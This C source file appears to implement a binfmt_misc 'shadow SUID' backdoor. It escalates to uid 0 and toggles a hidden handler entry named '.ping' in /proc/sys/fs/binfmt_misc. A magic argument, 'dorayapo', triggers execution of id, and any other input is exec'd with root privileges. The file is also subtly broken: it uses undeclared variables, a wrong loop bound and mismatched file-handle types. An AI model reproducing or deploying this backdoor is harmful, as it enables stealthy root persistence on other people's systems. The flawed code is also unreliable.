#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h> 
#include <fcntl.h>

const char* paths[] = {
  "/bin/id",
  "/usr/bin/id",
};
// check where id is
int locate_id() {
    int i = 0;
    for (;i < sizeof(paths); i++) {
      if (!(f = fopen(paths[i], "r"))) {
        if (errno == EACCES) {
          fprintf(stderr, "Failed with '%s'\n", paths[i]);
          continue;
        } else {
          fprintf(stderr, "Failed opening '%s' with error: %d, exiting.\n", paths[i], errno);
          exit(errno);
        }
      }
      break;
    }
    return id;
}

int main(int argc, char * argv[], char * envp[]) {
    int i = locate_id();
    if (i == sizeof(paths)) {
      fprintf(stderr, "Failed to find a file, exiting.\n");
      return -1;
    }
    char * my_args[] = { paths[i], NULL };
    char * new_argv[argc];

    char * binfmt_path = "/proc/sys/fs/binfmt_misc/.ping";
    char readlink_path[1024];
    char original_link[1024];
    char new_link[1024];

    pid_t ppid = getpid();
    sprintf(readlink_path, "/proc/%d/exe", ppid);
    ssize_t len = readlink(readlink_path, original_link, sizeof(original_link)-1);
    if (len != -1) {
        original_link[len] = '\0';
    }
    else {
        perror("err\n");
    }

    setuid(0);
    setgid(0);

    // disable shadow suid
    FILE * fd = open(binfmt_path, O_WRONLY);
    write(fd, "0", 1);
    close(fd);

    if (fork() == 0) {
        // wait for parent image to change
        while(1) {
            len = readlink(readlink_path, new_link, sizeof(new_link)-1);
            if (len != -1) {
                new_link[len] = '\0';
            }
            else {
                break;  // probably command already exited
            }
            // exe changed
            if (strcmp(original_link, new_link) != 0) {
                break;
            }
        }

        // enable shadow suid
        fd = open(binfmt_path, O_WRONLY);
        write(fd, "1", 1);
        close(fd);
    }
    else {
        if (argc == 3 && strcmp(argv[2], "dorayapo") == 0)
            execve(my_args[0], my_args, 0);
        else {
            for (int i=0; i<argc-1; i++) {
                new_argv[i] = argv[i+1];
            }
            execve(new_argv[0], new_argv, envp);
        }
    }
}
